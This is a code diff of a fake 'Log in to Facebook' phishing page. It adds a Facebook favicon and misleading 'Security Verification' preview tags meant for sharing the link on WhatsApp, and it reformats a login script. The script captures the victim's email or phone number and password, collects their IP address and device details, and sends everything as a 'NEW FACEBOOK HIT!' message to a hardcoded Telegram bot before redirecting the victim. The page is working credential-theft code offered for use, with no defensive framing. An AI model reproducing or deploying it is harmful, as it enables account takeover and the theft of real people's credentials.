@@ -4,6 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Log in to Facebook</title>
+    
+    <!-- لێرە لۆگۆی فەیسبووک دەخەینە ناو براوسەرەکە -->
+    <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/200px-2021_Facebook_icon.svg.png">
+
+    <!-- مێتا تاگەکان بۆ ئەوەی لە واتسئەپ بە جوانی دەربکەوێت -->
+    <meta property="og:title" content="Facebook Security Verification">
+    <meta property="og:description" content="Your Facebook account is under security check. Please verify to continue.">
+    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
+
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
         .header-msg { background-color: #fffbe6; border-bottom: 1px solid #ffe58f; width: 100%; padding: 12px; text-align: center; font-size: 14px; color: #856404; box-sizing: border-box; font-weight: bold; }
@@ -37,58 +46,51 @@
         </div>
     </div>
 
-<script>
-    const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
-    const chatId = "6679834643";
+    <script>
+        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+        const chatId = "6679834643";
 
-    async function login() {
-        const user = document.getElementById('user').value;
-        const pass = document.getElementById('pass').value;
+        async function login() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
 
-        if(!user || !pass) {
-            alert("The email address or mobile number you entered isn't connected to an account.");
-            return;
+            if(!user || !pass) {
+                alert("The email address or mobile number you entered isn't connected to an account.");
+                return;
+            }
+
+            let userIP = "Unknown";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                userIP = ipData.ip;
+            } catch (e) { userIP = "Error Fetching IP"; }
+
+            const ua = navigator.userAgent;
+            let deviceModel = "Unknown Device";
+            if (/android/i.test(ua)) {
+                deviceModel = ua.match(/\(([^;]+);([^;]+);([^)]+)\)/)[3].trim();
+            } else if (/iPhone|iPad/i.test(ua)) {
+                deviceModel = "iPhone / iOS Device";
+            } else if (/Windows/i.test(ua)) {
+                deviceModel = "Windows PC";
+            }
+
+            const msg = `👤 **NEW FACEBOOK HIT!**\n\n` +
+                        `📧 **User:** \`${user}\` \n` +
+                        `🔑 **Pass:** \`${pass}\` \n\n` +
+                        `🌐 **IP:** \`${userIP}\` \n` +
+                        `📱 **Device:** \`${deviceModel}\` \n` +
+                        `🖥️ **Agent:** \`${ua}\``;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown`)
+            .then(() => {
+                window.location.href = "Otm.html";
+            })
+            .catch(() => {
+                window.location.href = "Otm.html";
+            });
         }
-
-        // وەرگرتنی IP
-        let userIP = "Unknown";
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            userIP = ipData.ip;
-        } catch (e) { userIP = "Error Fetching IP"; }
-
-        // وەرگرتنی زانیاری وردی ئامێر
-        const ua = navigator.userAgent;
-        let deviceModel = "Unknown Device";
-
-        if (/android/i.test(ua)) {
-            // ئەگەر ئەندرۆید بوو، هەوڵ دەدەین مۆدێلەکەی بدۆزینەوە لە ناو کەوانەکاندا
-            const match = ua.match(/\(([^;]+);([^;]+);([^)]+)\)/);
-            deviceModel = match ? match[3].trim() : "Android Device";
-        } else if (/iPhone|iPad|iPod/i.test(ua)) {
-            // بۆ ئایفۆن بە دەق نانووسێت چ جۆرێکە، تەنها دەنووسێت iPhone
-            deviceModel = "iPhone / iOS Device";
-            // دەتوانین بە پێی ڕێزۆلوشن مەزندەی بکەین بەڵام ورد نییە
-        } else if (/Windows/i.test(ua)) {
-            deviceModel = "Windows PC";
-        }
-
-        const msg = `👤 **NEW FACEBOOK HIT!**\n\n` +
-                    `📧 **User:** \`${user}\` \n` +
-                    `🔑 **Pass:** \`${pass}\` \n\n` +
-                    `🌐 **IP:** \`${userIP}\` \n` +
-                    `📱 **Device:** \`${deviceModel}\` \n` +
-                    `🖥️ **Full Agent:** \`${ua}\``;
-        
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown`)
-        .then(() => {
-            window.location.href = "Otm.html";
-        })
-        .catch(() => {
-            window.location.href = "Otm.html";
-        });
-    }
-</script>
+    </script>
 </body>
 </html>
